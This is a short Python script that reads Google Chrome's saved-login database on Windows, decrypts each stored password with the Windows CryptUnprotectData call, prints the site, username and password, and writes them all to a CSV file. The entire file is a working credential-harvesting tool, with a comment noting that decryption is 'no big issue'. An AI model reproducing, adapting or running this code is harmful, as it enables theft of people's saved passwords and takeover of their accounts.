from os import getenv
import sqlite3
import win32crypt
csv_file = open("chromepass.csv",'wb')
csv_file.write("link,username,password\n".encode('utf-8'))
appdata = getenv("APPDATA") 
if appdata[-7:] == "Roaming": #Some WINDOWS Installations point to Roaming.
	appdata = appdata[:-8]
connection = sqlite3.connect(appdata + "\Local\Google\Chrome\\User Data\Default\Login Data")
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for information in cursor.fetchall():
        #chrome encrypts the password with Windows WinCrypt.
	#Fortunately Decrypting it is no big issue.
        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
	if password:
		print('website_link ' + information[0])
		print('Username: ' + information[1])
		print('Password: ' + str(password))
		csv_file.write(('%s,%s,%s\n'%(information[0],information[1],password)).encode('utf-8'))

csv_file.close()		
